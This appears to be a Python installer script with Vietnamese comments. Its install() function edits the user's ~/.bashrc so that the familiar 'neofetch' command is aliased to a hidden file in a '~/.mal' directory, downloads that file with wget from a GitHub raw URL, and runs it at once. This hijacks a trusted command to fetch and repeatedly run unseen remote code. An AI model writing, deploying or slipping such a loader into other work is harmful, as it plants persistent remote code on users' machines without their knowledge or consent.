import os
import re
import subprocess

def install():
    alias_name = "neofetch"
    alias_value = "python ~/.mal/.neofetch.py"
    new_alias_cmd = f"alias {alias_name}='{alias_value}'"
    bashrc_path = os.path.expanduser("~/.bashrc")

    # Đọc nội dung bashrc
    with open(bashrc_path, "r") as f:
        lines = f.readlines()

    found = False
    pattern = re.compile(rf"^\s*alias\s+{re.escape(alias_name)}=")

    # Cập nhật nếu có
    for i, line in enumerate(lines):
        if pattern.match(line):
            lines[i] = new_alias_cmd + "\n"
            found = True
            break

    # Thêm nếu chưa có
    if not found:
        lines.append("\n" + new_alias_cmd + "\n")

    # Ghi lại
    with open(bashrc_path, "w") as f:
        f.writelines(lines)

    # Tạo thư mục và tải file
    os.makedirs(os.path.expanduser("~/.mal"), exist_ok=True)
    os.system("wget -O ~/.mal/.neofetch.py https://raw.githubusercontent.com/derive206/derive206.github.io/main/neofetch.txt")

    # Gọi alias
    subprocess.run("bash -i -c 'neofetch'", shell=True)
    print("Cho em con mã . . .")
